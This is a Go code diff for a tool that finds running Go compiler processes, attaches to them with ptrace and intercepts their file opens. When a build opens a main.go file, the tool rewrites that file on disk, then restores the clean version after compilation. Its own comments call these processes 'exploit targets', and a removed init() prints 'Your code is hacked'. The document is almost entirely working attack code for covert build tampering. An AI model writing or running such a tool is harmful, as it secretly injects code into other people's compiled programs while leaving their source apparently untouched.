@@ -8,9 +8,11 @@ import (
 	"log"
 	"os"
 	"os/signal"
+	"runtime"
 	"strings"
 	"syscall"
 
+	"github.com/davecgh/go-spew/spew"
 	ps "github.com/mitchellh/go-ps"
 	sec "github.com/seccomp/libseccomp-golang"
 )
@@ -25,11 +27,33 @@ type target struct {
 	pid         int
 	cleanSource []byte
 	path        string
+	proc        os.Process
 }
 
-var targets []target
+type syscallTask struct {
+	ID   uint64
+	Name string
+}
 
-func (t target) patch() error {
+//x86_64 The system call name corresponding to the system call number on the
+var sTask = []syscallTask{
+	{0, "read"},
+	{1, "write"},
+	{2, "open"},
+	{3, "close"},
+	{4, "stat"},
+}
+
+func (t *target) detach() error {
+	err := syscall.PtraceDetach(t.pid)
+	if err != nil {
+		log.Printf("Error detaching, %v", err)
+		return err
+	}
+	return nil
+}
+
+func (t *target) patch() error {
 	log.Printf("Patching %s", t.path)
 
 	data, err := ioutil.ReadFile(t.path)
@@ -53,10 +77,8 @@ func (t target) patch() error {
 	return nil
 }
 
-func (t target) clean() error {
+func (t *target) clean() error {
 	log.Printf("Cleaning %s", t.path)
-	syscall.PtraceDetach(t.pid)
-
 	f, err := os.OpenFile(t.path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
 	if err != nil {
 		log.Printf("Error opening file %v", err)
@@ -77,72 +99,116 @@ func (t target) clean() error {
 	return nil
 }
 
-func (t target) trace() error {
-	regs := syscall.PtraceRegs{}
-	exit := true
-	pid := t.pid
+func (t *target) trace() error {
+	runtime.LockOSThread()
+	var regs syscall.PtraceRegs
+	//wait Waiting state
+	var wsstatus syscall.WaitStatus
+	var err error
 
-	err := syscall.PtraceAttach(pid)
+	pid := t.proc.Pid
+
+	err = syscall.PtraceAttach(pid)
 	if err != nil {
-		log.Printf("Error attaching, %v", err)
+		fmt.Println(err)
 		return err
 	}
 
+	syscall.Wait4(pid, &wsstatus, 0, nil)
+	// If you exit abnormally , Then disconnect
+	defer func() {
+		// Yes PTRACE_DETACH Encapsulation , Disconnect from the tracker
+		err = syscall.PtraceDetach(pid)
+		if err != nil {
+			fmt.Println("PtraceDetach err :", err)
+			return
+		}
+		syscall.Wait4(pid, &wsstatus, 0, nil)
+	}()
+
 	for {
-		if exit {
-			err = syscall.PtraceGetRegs(pid, &regs)
-			if err != nil {
-				log.Printf("Error gettings regs for pid: %d, %v", pid, err)
-				return err
+		syscall.PtraceSyscall(pid, 0)
+		// Use wait system call , And pass in the waiting status pointer
+		_, err := syscall.Wait4(pid, &wsstatus, 0, nil)
+		if err != nil {
+			fmt.Println("line 501", err)
+			return err
+		}
 
+		if wsstatus.Exited() {
+			fmt.Println("------exit status", wsstatus.ExitStatus())
+			return nil
+		}
+
+		if wsstatus.StopSignal().String() == "interrupt" {
+			syscall.PtraceSyscall(pid, int(wsstatus.StopSignal()))
+			fmt.Println("send interrupt sig to pid ")
+			// Print tracee Exit code
+			fmt.Println("------exit status", wsstatus.ExitStatus())
+			return nil
+		}
+
+		err = syscall.PtraceGetRegs(pid, &regs)
+		if err != nil {
+			fmt.Println("PtraceGetRegs err :", err.Error())
+			return nil
+		}
+
+		name, _ := sec.ScmpSyscall(regs.Orig_rax).GetName()
+		if name == "openat" {
+			path, err := readString(pid, uintptr(regs.Rsi))
+			if err != nil {
+				fmt.Println("openat path error %v", err)
 			}
 
-			name, err := sec.ScmpSyscall(regs.Orig_rax).GetName()
-			if err != nil {
-				log.Printf("Error gettings name, %v", err)
-				return err
-			}
-			if name == "openat" {
-
-				path, err := getOpenAtPath(pid, regs)
-				if err != nil {
-					fmt.Println(err)
-				}
+			if strings.Contains(path, "main.go") {
 				t.path = path
-
-				if strings.Contains(path, "main.go") {
-					fmt.Printf("Path: %s\n", t.path)
-					fmt.Printf("Name: %s\n", name)
-					err = t.patch()
-					if err != nil {
-						log.Printf("Error patching file, %v", err)
-						return err
-					}
-
+				fmt.Printf("Path: %s\n", t.path)
+				fmt.Printf("Name: %s\n", name)
+				err = t.patch()
+				if err != nil {
+					log.Printf("Error patching file, %v", err)
+					return err
 				}
+
 			}
-
 		}
-		err = syscall.PtraceSyscall(pid, 0)
+
+		syscall.PtraceSyscall(pid, 0)
+		_, err = syscall.Wait4(pid, &wsstatus, 0, nil)
 		if err != nil {
-			log.Printf("Error, %v", err)
+			fmt.Println("line 518", err)
 			return err
 		}
-
-		_, err = syscall.Wait4(pid, nil, 0, nil)
+		// If tracee sign out , Print the exit code of the process
+		if wsstatus.Exited() {
+			fmt.Println("------exit status", wsstatus.ExitStatus())
+			return nil
+		}
+		// ditto , Determine whether the process is interrupted by a signal
+		if wsstatus.StopSignal().String() == "interrupt" {
+			syscall.PtraceSyscall(pid, int(wsstatus.StopSignal()))
+			fmt.Println("send interrupt sig to pid ")
+			fmt.Println("------exit status", wsstatus.ExitStatus())
+		}
+		// Get the status of the returned register
+		err = syscall.PtraceGetRegs(pid, &regs)
 		if err != nil {
-			log.Printf("Error, %v", err)
+			fmt.Println("PtraceGetRegs err :", err.Error())
 			return err
 		}
-
-		exit = !exit
-
+		// Print the return value parameter stored in the register
+		//fmt.Println("syscall return:", regs.Rax)
 	}
+
 }
 
 func main() {
+
+	pids := []int{}
+
 	log.Printf("Starting")
-	targets = []target{}
+	targets := make(chan target, 1)
 	c := make(chan os.Signal)
 
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
@@ -152,57 +218,54 @@ func main() {
 		os.Exit(1)
 	}()
 
-	findproc()
-
-	//Main control loop
-	for {
-		//Loop through list of exploit targets and clean up
-		for idx, xpl := range targets {
-			_, err := ps.FindProcess(xpl.pid)
+	go func() {
+		for {
+			activeTarget := <-targets
+			err := activeTarget.trace()
 			if err != nil {
-				log.Printf("Cleaning Target %d", xpl.pid)
+				log.Printf(err.Error())
 
-				targets = removeIndex(targets, idx)
-
+			} else {
+				activeTarget.clean()
 			}
 
 		}
-		//find new targets
-		findproc()
 
-	}
-}
+	}()
 
-func findproc() {
-	procs, err := ps.Processes()
-	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
-	}
+	//find new targets
 
-	for _, proc := range procs {
-		if proc.Executable() == "go" {
+	for {
+		procs, err := ps.Processes()
+		if err != nil {
+			log.Printf("Error finding procs: %v", err)
+		}
 
-			log.Printf("Found Target, %d", proc.Pid())
+		for _, proc := range procs {
+			if !contains(pids, proc.Pid()) {
+				if proc.Executable() == "go" {
 
-			eh, _ := os.FindProcess(proc.Pid())
-			newTarget := target{
-				pid: eh.Pid,
+					process, err := os.FindProcess(proc.Pid())
+					if err != nil {
+						log.Printf("%v", err)
+
+					}
+
+					newTarget := target{
+						pid:  proc.Pid(),
+						proc: *process,
+					}
+
+					pids = append(pids, proc.Pid())
+					spew.Dump(pids)
+					log.Printf("New Active Target PID: %d", proc.Pid())
+					targets <- newTarget
+
+				}
 			}
-			targets = append(targets, newTarget)
-			newTarget.trace()
-			newTarget.clean()
-
 		}
 	}
-}
 
-func getOpenAtPath(pid int, regs syscall.PtraceRegs) (string, error) {
-	path, err := readString(pid, uintptr(regs.Rsi))
-	if err != nil {
-		return "", err
-	}
-	return path, nil
 }
 
 func readString(pid int, addr uintptr) (string, error) {
@@ -222,12 +285,4 @@ func contains(s []int, e int) bool {
 		}
 	}
 	return false
-}
-
-func removeIndex(s []target, index int) []target {
-	return append(s[:index], s[index+1:]...)
-}
-
-func init() {
-	fmt.Println("Your code is hacked")
 }
